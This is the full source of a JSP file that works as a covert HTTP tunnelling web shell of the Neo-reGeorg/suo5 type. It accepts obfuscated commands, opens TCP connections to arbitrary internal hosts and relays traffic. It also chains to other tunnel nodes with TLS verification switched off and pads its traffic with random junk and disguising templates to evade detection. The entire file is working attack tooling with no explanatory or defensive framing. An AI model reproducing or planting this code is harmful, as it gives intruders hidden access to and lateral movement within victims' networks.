<%@ page import="java.io.*" %><%@ page import="java.net.*" %><%@ page import="javax.servlet.*" %><%@ page import="javax.servlet.http.*" %><%@ page import="java.nio.*" %><%@ page import="java.nio.channels.*" %><%@ page import="java.util.*" %><%@ page import="java.util.concurrent.*" %><%@ page import="javax.net.ssl.*" %><%@ page import="java.security.cert.*" %><%!
    private static final Map<String, Boolean> _localIPs = new HashMap<String, Boolean>();
    private static final Map<String, Object> _sessions = new Hashtable<String, Object>();

    static {
        try {
            for (Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces(); nets.hasMoreElements(); ) {
                for (Enumeration<InetAddress> addrs = nets.nextElement().getInetAddresses(); addrs.hasMoreElements(); ) {
                    String ip = addrs.nextElement().getHostAddress();
                    if (ip != null) {
                        int idx = ip.indexOf('%');
                        _localIPs.put(idx > 0 ? ip.substring(0, idx) : ip, Boolean.TRUE);
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

    class H implements Runnable, X509TrustManager, HostnameVerifier {
        private final int CHUNK = 1024 * 16;
        private InputStream up;
        private OutputStream down;
        private String tunnel;
        private int opMode;

        H() {}
        H(InputStream i, OutputStream o, String t) { up = i; down = o; tunnel = t; }
        H(String t, int m) { tunnel = t; opMode = m; }

        void serve(ServletRequest req, ServletResponse rsp) {
            HttpServletRequest r = (HttpServletRequest) req;
            HttpServletResponse s = (HttpServletResponse) rsp;
            String sid = null;
            byte[] head = new byte[0];
            try {
                Map<String, byte[]> pkt = decode(r.getInputStream());
                if (pkt == null) return;

                byte[] m = pkt.get("m");
                byte[] ac = pkt.get("ac");
                byte[] id = pkt.get("id");
                byte[] sId = pkt.get("sid");
                if (ac == null || ac.length != 1 || id == null || id.length == 0 || m == null || m.length == 0) return;
                if (sId != null && sId.length > 0) sid = new String(sId);
                String tid = new String(id);
                byte mode = m[0];

                if (mode == 0) {
                    sid = randStr(16);
                    doCheck(r, s, pkt, tid, sid);
                } else if (mode == 1 || mode == 2 || mode == 3) {
                    disableBuffer(s);
                    if (mode == 3) {
                        byte[] raw = readAll(r.getInputStream());
                        if (!doProxy(r, s, pkt, head, raw)) {
                            if (sId == null || sId.length == 0 || _sessions.get(new String(sId)) == null) {
                                s.setStatus(403);
                                return;
                            }
                            InputStream bs = new ByteArrayInputStream(raw);
                            int pad = padSize(sid);
                            ByteArrayOutputStream out = new ByteArrayOutputStream();
                            out.write(openTpl(s, sid));
                            for (;;) {
                                doClassic(r, out, pkt, tid);
                                pkt = decode(bs);
                                if (pkt == null || pkt.isEmpty()) break;
                                tid = new String(pkt.get("id"));
                            }
                            out.write(closeTpl(sid));
                            s.setContentLength(out.size());
                            flush(s, out.toByteArray(), 0);
                        }
                    } else {
                        if (mode == 2) {
                            byte[] raw = readAll(r.getInputStream());
                            if (doProxy(r, s, pkt, head, raw)) return;
                            if (sId == null || sId.length == 0 || _sessions.get(new String(sId)) == null) {
                                s.setStatus(403);
                                return;
                            }
                            InputStream bs = new ByteArrayInputStream(raw);
                            int pad = padSize(sid);
                            flush(s, openTpl(s, sid), pad);
                            for (;;) {
                                doHalf(r, s, pkt, tid, pad);
                                pkt = decode(bs);
                                if (pkt == null || pkt.isEmpty()) break;
                                tid = new String(pkt.get("id"));
                            }
                            flush(s, closeTpl(sid), pad);
                        } else {
                            streamConn(r, s, pkt, tid);
                        }
                    }
                }
            } catch (Throwable ignored) {
            } finally {
                try { OutputStream os = s.getOutputStream(); os.flush(); os.close(); } catch (Throwable ignored) {}
            }
        }

        void disableBuffer(HttpServletResponse s) { s.setBufferSize(CHUNK); s.setHeader("X-Accel-Buffering", "no"); }

        byte[] openTpl(HttpServletResponse s, String sid) throws Exception {
            Object v = _sessions.get(sid);
            if (!(v instanceof String[])) return new byte[0];
            String[] p = (String[]) v;
            if (p.length != 3) return new byte[0];
            s.setHeader("Content-Type", p[0]);
            return p[1].getBytes();
        }

        byte[] closeTpl(String sid) {
            Object v = _sessions.get(sid);
            if (!(v instanceof String[])) return new byte[0];
            String[] p = (String[]) v;
            if (p.length != 3) return new byte[0];
            return p[2].getBytes();
        }

        int padSize(String sid) {
            Object v = _sessions.get(sid + "_pad");
            return v instanceof Integer ? (Integer) v : 0;
        }

        boolean doProxy(HttpServletRequest r, HttpServletResponse s, Map<String, byte[]> pkt, byte[] prefix, byte[] body) throws Exception {
            byte[] redir = pkt.remove("r");
            if (redir == null || redir.length == 0) return false;
            String url = new String(redir);
            if (_localIPs.containsKey(new URL(url).getHost())) return false;
            HttpURLConnection c = null;
            try {
                ByteArrayOutputStream ba = new ByteArrayOutputStream();
                ba.write(prefix);
                ba.write(encode(pkt));
                ba.write(body);
                c = forward(r, url, ba.toByteArray());
                s.setStatus(c.getResponseCode());
                pump(c.getInputStream(), s.getOutputStream(), s, false);
            } finally { if (c != null) c.disconnect(); }
            return true;
        }

        void doCheck(HttpServletRequest r, HttpServletResponse s, Map<String, byte[]> pkt, String tid, String sid) throws Exception {
            byte[] redir = pkt.get("r");
            if (redir != null && redir.length > 0 && !_localIPs.containsKey(new URL(new String(redir)).getHost())) {
                s.setStatus(403);
                return;
            }
            byte[] tpl = pkt.get("tpl");
            byte[] ct = pkt.get("ct");
            if (tpl != null && tpl.length > 0 && ct != null && ct.length > 0) {
                String[] parts = new String(tpl).split("#data#", 2);
                _sessions.put(sid, new String[]{new String(ct), parts[0], parts[1]});
            } else {
                _sessions.put(sid, new String[0]);
            }
            byte[] jk = pkt.get("jk");
            if (jk != null && jk.length > 0) {
                try {
                    int sz = Integer.parseInt(new String(jk));
                    _sessions.put(sid + "_pad", sz < 0 ? 0 : sz);
                } catch (NumberFormatException ignored) {}
            }
            byte[] auto = pkt.get("a");
            boolean streaming = auto != null && auto.length > 0 && auto[0] == 1;
            if (streaming) {
                disableBuffer(s);
                flush(s, openTpl(s, sid), 0);
                flush(s, encode(mkData(tid, pkt.get("dt"))), 0);
                Thread.sleep(2000);
                flush(s, encode(mkData(tid, sid.getBytes())), 0);
                flush(s, closeTpl(sid), 0);
            } else {
                ByteArrayOutputStream ba = new ByteArrayOutputStream();
                ba.write(openTpl(s, sid));
                ba.write(encode(mkData(tid, pkt.get("dt"))));
                ba.write(encode(mkData(tid, sid.getBytes())));
                ba.write(closeTpl(sid));
                s.setContentLength(ba.size());
                flush(s, ba.toByteArray(), 0);
            }
        }

        void streamConn(HttpServletRequest r, HttpServletResponse s, Map<String, byte[]> pkt, String tid) throws Exception {
            String host = new String(pkt.get("h"));
            int port = Integer.parseInt(new String(pkt.get("p")));
            if (port == 0) port = localPort(r);
            Socket sock = null;
            try {
                sock = new Socket();
                sock.setTcpNoDelay(true);
                sock.setReceiveBufferSize(128 * 1024);
                sock.setSendBufferSize(128 * 1024);
                sock.connect(new InetSocketAddress(host, port), 5000);
                flush(s, encode(mkStatus(tid, (byte) 0)), 0);
            } catch (Exception e) {
                if (sock != null) sock.close();
                flush(s, encode(mkStatus(tid, (byte) 1)), 0);
                return;
            }
            Thread worker = null;
            boolean needClose = true;
            OutputStream sout = sock.getOutputStream();
            InputStream sin = sock.getInputStream();
            OutputStream out = s.getOutputStream();
            try {
                worker = new Thread(new H(sin, out, tid));
                worker.start();
                for (;;) {
                    Map<String, byte[]> np = decode(r.getInputStream());
                    if (np == null || np.isEmpty()) break;
                    byte a = np.get("ac")[0];
                    if (a == 0 || a == 2) { needClose = false; }
                    else if (a == 1) { byte[] d = np.get("dt"); if (d.length > 0) { sout.write(d); sout.flush(); } }
                    else if (a == 0x10) flush(s, encode(mkHeart(tid)), 0);
                }
            } catch (Exception ignored) {} finally {
                try { sock.close(); } catch (Exception ignored) {}
                if (needClose) flush(s, encode(mkDel(tid)), 0);
                if (worker != null) worker.join();
            }
        }

        void doHalf(HttpServletRequest r, HttpServletResponse s, Map<String, byte[]> pkt, String tid, int pad) throws Exception {
            boolean keepAlive = true;
            try {
                byte a = pkt.get("ac")[0];
                if (a == 0) {
                    byte[] created = doCreate(r, pkt, tid, false);
                    flush(s, created, pad);
                    Object[] arr = (Object[]) _sessions.get(tid);
                    if (arr == null) throw new IOException("no tunnel");
                    SocketChannel ch = (SocketChannel) arr[0];
                    ByteBuffer buf = ByteBuffer.allocate(CHUNK);
                    for (;;) {
                        try {
                            byte[] d = readCh(ch, buf);
                            if (d.length == 0) break;
                            flush(s, encode(mkData(tid, d)), pad);
                        } catch (Exception e) { break; }
                    }
                } else if (a == 1) {
                    doWrite(pkt, tid, false);
                } else if (a == 2) {
                    keepAlive = false;
                    doRemove(tid);
                } else if (a == 0x10) {
                    flush(s, encode(mkHeart(tid)), pad);
                }
            } catch (Exception e) {
                doRemove(tid);
                if (keepAlive) flush(s, encode(mkDel(tid)), pad);
            }
        }

        void doClassic(HttpServletRequest r, ByteArrayOutputStream out, Map<String, byte[]> pkt, String tid) throws Exception {
            boolean keepAlive = true;
            try {
                byte a = pkt.get("ac")[0];
                if (a == 0) {
                    out.write(doCreate(r, pkt, tid, true));
                } else if (a == 1) {
                    doWrite(pkt, tid, true);
                    out.write(doRead(tid));
                } else if (a == 2) {
                    keepAlive = false;
                    doRemove(tid);
                }
            } catch (Exception e) {
                doRemove(tid);
                if (keepAlive) out.write(encode(mkDel(tid)));
            }
        }

        void flush(HttpServletResponse s, byte[] data, int pad) throws Exception {
            if (data == null || data.length == 0) return;
            OutputStream o = s.getOutputStream();
            o.write(data);
            if (pad > 0) o.write(encode(mkJunk(pad)));
            o.flush();
            s.flushBuffer();
        }

        byte[] doCreate(HttpServletRequest r, Map<String, byte[]> pkt, String tid, boolean spawn) throws Exception {
            String host = new String(pkt.get("h"));
            int port = Integer.parseInt(new String(pkt.get("p")));
            if (port == 0) port = localPort(r);
            ByteArrayOutputStream ba = new ByteArrayOutputStream();
            SocketChannel ch = null;
            Map<String, byte[]> res;
            try {
                ch = SocketChannel.open();
                ch.socket().setTcpNoDelay(true);
                ch.socket().setReceiveBufferSize(128 * 1024);
                ch.socket().setSendBufferSize(128 * 1024);
                ch.socket().connect(new InetSocketAddress(host, port), 3000);
                ch.configureBlocking(true);
                res = mkStatus(tid, (byte) 0);
                LinkedBlockingQueue<byte[]> rq = new LinkedBlockingQueue<byte[]>(100);
                LinkedBlockingQueue<byte[]> wq = new LinkedBlockingQueue<byte[]>();
                _sessions.put(tid, new Object[]{ch, rq, wq});
                if (spawn) {
                    new Thread(new H(tid, 1)).start();
                    new Thread(new H(tid, 2)).start();
                }
            } catch (Exception e) {
                if (ch != null) try { ch.close(); } catch (Exception ignored) {}
                res = mkStatus(tid, (byte) 1);
            }
            ba.write(encode(res));
            return ba.toByteArray();
        }

        void doWrite(Map<String, byte[]> pkt, String tid, boolean spawn) throws Exception {
            Object[] arr = (Object[]) _sessions.get(tid);
            if (arr == null) throw new IOException("no tunnel");
            SocketChannel ch = (SocketChannel) arr[0];
            if (!ch.isOpen()) return;
            byte[] data = pkt.get("dt");
            if (data.length > 0) {
                if (spawn) {
                    ((BlockingQueue<byte[]>) arr[2]).put(data);
                } else {
                    ByteBuffer buf = ByteBuffer.wrap(data);
                    while (buf.hasRemaining()) ch.write(buf);
                }
            }
        }

        byte[] doRead(String tid) throws Exception {
            Object[] arr = (Object[]) _sessions.get(tid);
            if (arr == null) throw new IOException("no tunnel");
            SocketChannel ch = (SocketChannel) arr[0];
            LinkedBlockingQueue<byte[]> rq = (LinkedBlockingQueue<byte[]>) arr[1];
            ByteArrayOutputStream ba = new ByteArrayOutputStream();
            int limit = 512 * 1024;
            int written = 0;
            for (;;) {
                byte[] d = rq.poll();
                if (d == null) break;
                written += d.length;
                ba.write(encode(mkData(tid, d)));
                if (written >= limit) break;
            }
            if (!ch.isOpen() && rq.isEmpty()) {
                doRemove(tid);
                ba.write(encode(mkDel(tid)));
            }
            return ba.toByteArray();
        }

        void doRemove(String tid) {
            Object[] arr = (Object[]) _sessions.get(tid);
            if (arr != null) {
                _sessions.remove(tid);
                SocketChannel ch = (SocketChannel) arr[0];
                LinkedBlockingQueue<byte[]> wq = (LinkedBlockingQueue<byte[]>) arr[2];
                try { wq.put(new byte[0]); ch.close(); } catch (Exception ignored) {}
            }
        }

        int localPort(HttpServletRequest r) throws Exception {
            try { return ((Integer) r.getClass().getMethod("getLocalPort").invoke(r)).intValue(); }
            catch (Exception e) { return ((Integer) r.getClass().getMethod("getServerPort").invoke(r)).intValue(); }
        }

        void pump(InputStream in, OutputStream out, HttpServletResponse s, boolean wrap) throws Exception {
            try {
                byte[] buf = new byte[8192];
                for (;;) {
                    int n = in.read(buf);
                    if (n <= 0) break;
                    byte[] d = Arrays.copyOfRange(buf, 0, n);
                    if (wrap) d = encode(mkData(tunnel, d));
                    out.write(d);
                    out.flush();
                    if (s != null) s.flushBuffer();
                }
            } finally { try { in.close(); } catch (Exception ignored) {} }
        }

        byte[] readCh(SocketChannel ch, ByteBuffer buf) throws IOException {
            buf.clear();
            int n = ch.read(buf);
            if (n <= 0) return new byte[0];
            buf.flip();
            byte[] d = new byte[buf.remaining()];
            buf.get(d);
            return d;
        }

        HttpURLConnection forward(HttpServletRequest r, String url, byte[] body) throws Exception {
            URL u = new URL(url);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod(r.getMethod());
            try { c.getClass().getMethod("setConnectTimeout", int.class).invoke(c, 3000); } catch (Exception ignored) {}
            try { c.getClass().getMethod("setReadTimeout", int.class).invoke(c, 0); } catch (Exception ignored) {}
            c.setDoOutput(true);
            c.setDoInput(true);
            if (c instanceof HttpsURLConnection) {
                HttpsURLConnection sc = (HttpsURLConnection) c;
                sc.setHostnameVerifier(this);
                SSLContext ctx = SSLContext.getInstance("SSL");
                ctx.init(null, new TrustManager[]{this}, null);
                sc.setSSLSocketFactory(ctx.getSocketFactory());
            }
            for (Enumeration<String> hs = r.getHeaderNames(); hs.hasMoreElements(); ) {
                String k = hs.nextElement();
                if (k.equalsIgnoreCase("Content-Length")) c.setRequestProperty(k, String.valueOf(body.length));
                else if (k.equalsIgnoreCase("Host")) c.setRequestProperty(k, u.getHost());
                else if (k.equalsIgnoreCase("Connection")) c.setRequestProperty(k, "close");
                else if (k.equalsIgnoreCase("Content-Encoding") || k.equalsIgnoreCase("Transfer-Encoding")) continue;
                else c.setRequestProperty(k, r.getHeader(k));
            }
            OutputStream o = c.getOutputStream();
            o.write(body); o.flush(); o.close();
            c.getResponseCode();
            return c;
        }

        byte[] readAll(InputStream in) {
            try {
                ByteArrayOutputStream ba = new ByteArrayOutputStream();
                byte[] buf = new byte[4096];
                for (;;) { int n = in.read(buf); if (n == -1) return ba.toByteArray(); ba.write(buf, 0, n); }
            } catch (IOException e) { return new byte[0]; }
        }

        void readExact(InputStream is, byte[] b) throws IOException {
            for (int off = 0; off < b.length; ) {
                int n = is.read(b, off, b.length - off);
                if (n == -1) throw new IOException("EOF");
                off += n;
            }
        }

        Map<String, byte[]> mkJunk(int size) {
            Map<String, byte[]> m = new HashMap<String, byte[]>();
            m.put("ac", new byte[]{0x11});
            if (size > 0) { byte[] d = new byte[size]; new Random().nextBytes(d); m.put("d", d); }
            return m;
        }

        Map<String, byte[]> mkData(String tid, byte[] d) {
            Map<String, byte[]> m = new HashMap<String, byte[]>();
            m.put("ac", new byte[]{1}); m.put("dt", d); m.put("id", tid.getBytes());
            return m;
        }

        Map<String, byte[]> mkDel(String tid) {
            Map<String, byte[]> m = new HashMap<String, byte[]>();
            m.put("ac", new byte[]{2}); m.put("id", tid.getBytes());
            return m;
        }

        Map<String, byte[]> mkStatus(String tid, byte b) {
            Map<String, byte[]> m = new HashMap<String, byte[]>();
            m.put("ac", new byte[]{3}); m.put("s", new byte[]{b}); m.put("id", tid.getBytes());
            return m;
        }

        Map<String, byte[]> mkHeart(String tid) {
            Map<String, byte[]> m = new HashMap<String, byte[]>();
            m.put("ac", new byte[]{0x10}); m.put("id", tid.getBytes());
            return m;
        }

        byte[] u32(int i) {
            return new byte[]{(byte)(i >>> 24), (byte)(i >>> 16), (byte)(i >>> 8), (byte)i};
        }

        int toU32(byte[] b) {
            return ((b[0] & 0xFF) << 24) | ((b[1] & 0xFF) << 16) | ((b[2] & 0xFF) << 8) | (b[3] & 0xFF);
        }

        String b64url(byte[] src) {
            try {
                Object enc = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
                String v = (String) enc.getClass().getMethod("encodeToString", byte[].class).invoke(enc, src);
                v = v.replace('+', '-').replace('/', '_');
                while (v.endsWith("=")) v = v.substring(0, v.length() - 1);
                return v;
            } catch (Exception e) { return null; }
        }

        byte[] unb64url(String src) {
            if (src == null) return null;
            src = src.replace('-', '+').replace('_', '/');
            while (src.length() % 4 != 0) src += "=";
            try {
                Object dec = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
                return (byte[]) dec.getClass().getMethod("decode", String.class).invoke(dec, src);
            } catch (Exception e) { return null; }
        }

        byte[] encode(Map<String, byte[]> map) throws Exception {
            Random rng = new Random();
            if (rng.nextInt(32) > 0) { byte[] j = new byte[rng.nextInt(32)]; rng.nextBytes(j); map.put("_", j); }
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            for (String k : map.keySet()) {
                byte[] v = map.get(k);
                buf.write(k.length());
                buf.write(k.getBytes());
                buf.write(u32(v.length));
                buf.write(v);
            }
            byte[] data = buf.toByteArray();
            byte[] k = new byte[]{(byte)(rng.nextInt(255) + 1), (byte)(rng.nextInt(255) + 1)};
            for (int i = 0; i < data.length; i++) data[i] ^= k[i % 2];
            data = b64url(data).getBytes();
            byte[] hdr = new byte[6];
            hdr[0] = k[0]; hdr[1] = k[1];
            System.arraycopy(u32(data.length), 0, hdr, 2, 4);
            for (int i = 2; i < 6; i++) hdr[i] ^= k[i % 2];
            hdr = b64url(hdr).getBytes();
            ByteBuffer out = ByteBuffer.allocate(8 + data.length);
            out.put(hdr); out.put(data);
            return out.array();
        }

        Map<String, byte[]> decode(InputStream in) throws Exception {
            Map<String, byte[]> m = new HashMap<String, byte[]>();
            byte[] hdr = new byte[8];
            readExact(in, hdr);
            hdr = unb64url(new String(hdr));
            if (hdr == null || hdr.length == 0) return m;
            byte[] xor = new byte[]{hdr[0], hdr[1]};
            for (int i = 2; i < 6; i++) hdr[i] ^= xor[i % 2];
            int len = ByteBuffer.wrap(hdr, 2, 4).getInt();
            if (len > 32 * 1024 * 1024) throw new IOException("too large");
            byte[] raw = new byte[len];
            readExact(in, raw);
            raw = unb64url(new String(raw));
            for (int i = 0; i < raw.length; i++) raw[i] ^= xor[i % 2];
            for (int i = 0; i < raw.length; ) {
                int kl = raw[i] & 0xFF; i++;
                if (i + kl > raw.length) throw new Exception("key len error");
                String key = new String(Arrays.copyOfRange(raw, i, i + kl));
                i += kl;
                if (i + 4 > raw.length) throw new Exception("value len error");
                int vl = toU32(Arrays.copyOfRange(raw, i, i + 4));
                i += 4;
                if (vl < 0 || i + vl > raw.length) throw new Exception("value error");
                m.put(key, Arrays.copyOfRange(raw, i, i + vl));
                i += vl;
            }
            return m;
        }

        String randStr(int len) {
            StringBuilder sb = new StringBuilder(len);
            Random rng = new Random();
            String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            for (int i = 0; i < len; i++) sb.append(chars.charAt(rng.nextInt(chars.length())));
            return sb.toString();
        }

        public boolean verify(String host, SSLSession s) { return true; }
        public void checkClientTrusted(X509Certificate[] c, String a) {}
        public void checkServerTrusted(X509Certificate[] c, String a) {}
        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }

        public void run() {
            if (opMode == 0) { try { pump(up, down, null, true); } catch (Exception ignored) {} return; }
            Object[] arr = (Object[]) _sessions.get(tunnel);
            if (arr == null || arr.length != 3) return;
            SocketChannel ch = (SocketChannel) arr[0];
            LinkedBlockingQueue<byte[]> rq = (LinkedBlockingQueue<byte[]>) arr[1];
            LinkedBlockingQueue<byte[]> wq = (LinkedBlockingQueue<byte[]>) arr[2];
            boolean cleanup = false;
            try {
                if (opMode == 1) {
                    ByteBuffer buf = ByteBuffer.allocate(CHUNK);
                    for (;;) {
                        byte[] d = readCh(ch, buf);
                        if (d.length == 0) break;
                        if (!rq.offer(d, 60, TimeUnit.SECONDS)) { cleanup = true; break; }
                    }
                } else {
                    for (;;) {
                        byte[] d = wq.poll(300, TimeUnit.SECONDS);
                        if (d == null) { cleanup = true; break; }
                        if (d.length == 0) { wq.poll(10, TimeUnit.SECONDS); break; }
                        ByteBuffer buf = ByteBuffer.wrap(d);
                        while (buf.hasRemaining()) ch.write(buf);
                    }
                }
            } catch (Exception ignored) {} finally {
                if (cleanup) { _sessions.remove(tunnel); rq.clear(); }
                wq.clear();
                try { wq.put(new byte[0]); ch.close(); } catch (Exception ignored) {}
            }
        }
    }
%><%
    H h = new H();
    h.serve(request, response);
    try { out.clear(); } catch (Exception ignored) {}
    out = pageContext.pushBody();
%>